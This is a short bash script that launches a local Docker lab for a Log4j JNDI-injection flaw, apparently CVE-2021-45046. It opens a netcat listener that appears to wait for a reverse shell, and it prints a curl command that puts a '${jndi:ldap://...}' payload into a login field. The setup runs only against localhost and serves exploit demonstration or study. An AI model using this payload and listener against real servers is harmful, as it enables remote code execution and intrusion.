#!/bin/bash
SCRIPT=$(realpath "$0")
SCRIPTPATH=$(dirname "$SCRIPT")
# bring down all docker images, including orphans
echo "============================================================"
echo "          Bringing down all containers first...             "
docker-compose down --remove-orphans
gnome-terminal --working-directory="${SCRIPTPATH}" -e "docker-compose up cve-45046-server" &
gnome-terminal --working-directory="${SCRIPTPATH}" -e "nc -lvnp 9001 " &

echo "          Docker containers should be up now..              "

echo "       Type the following command in a new terminal:        "
echo "curl -d 'uname=\${jndi:ldap://localhost:1389/a}' -X POST \"http://localhost:8080/login\""
echo "============================================================"
docker-compose up modified-alpine